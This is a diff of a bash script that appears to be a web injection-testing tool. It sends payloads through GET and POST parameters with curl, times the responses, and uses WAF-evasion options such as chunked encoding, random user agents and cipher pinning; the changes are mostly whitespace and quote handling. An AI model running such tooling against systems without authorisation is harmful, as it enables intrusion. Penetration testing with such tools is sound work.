@@ -108,13 +108,12 @@ fi
       output_text="[\033[34m${current_time}\033[0m] [i] Attempting \033[1m${technique_name}\033[0m injection technique (Vector 1 & 2)."
     fi
     echo -e "$output_text"
-         
-    if [ "$current_method" = "POST" ]; then
+        if [ "$current_method" = "POST" ]; then
       local post_data=""
       local send_to_url=""
 
       if [ "$is_raw_post" = true ]; then
-        post_data=$(echo "$target_url" | sed "s/\b${current_param}=[^&]*/${current_param}=${active_payload}/g")        
+        post_data=$(echo "$target_url" | sed "s/\b${current_param}=[^&]*/${current_param}=${active_payload}/g")
         send_to_url="$clean_target_url"
       else
         post_data="${current_param}=${active_payload}"
@@ -124,20 +123,20 @@ fi
       local payload_length=${#post_data}
       if [ "$payload_length" -gt 250 ]; then
         chunked_headers+=(-H "Transfer-Encoding: chunked")
-      fi
-
-      curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
+      fi      
+      curl_output=$(command curl $proxy_flag $cookie_flag ${waf_args//\"/} $rapid_reset_args "${chunked_headers[@]}" \
         --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
         -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
         -w "%{time_total}|%{http_code}" \
         "$send_to_url")
-    else
-      curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args \
+    else      
+      curl_output=$(command curl $proxy_flag $cookie_flag ${waf_args//\"/} $rapid_reset_args \
         --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
         -m 12 -A "$random_ua" -s -o /dev/null \
         -w "%{time_total}|%{http_code}" \
         "${clean_target_url}${join_char}${current_param}=${active_payload}")
-    fi
+    fi     
+    
       local stopwatch
       local http_status
       stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
@@ -252,7 +251,7 @@ fi
       join_char="&"
     fi      
 
-    if [ "$current_method" = "POST" ]; then
+        if [ "$current_method" = "POST" ]; then
       local post_data=""
       local send_to_url=""
 
@@ -267,15 +266,14 @@ fi
       local payload_length=${#post_data}
       if [ "$payload_length" -gt 250 ]; then
         chunked_headers+=(-H "Transfer-Encoding: chunked")
-      fi
-
-      curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
+      fi      
+      curl_output=$(command curl $proxy_flag $cookie_flag ${waf_args//\"/} $rapid_reset_args "${chunked_headers[@]}" \
         --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
         -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
         -w "%{time_total}|%{http_code}" \
         "$send_to_url")
     else
-      curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args \
+      curl_output=$(command curl $proxy_flag $cookie_flag ${waf_args//\"/} $rapid_reset_args \
         --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
         -m 12 -A "$random_ua" -s -o /dev/null \
         -w "%{time_total}|%{http_code}" \
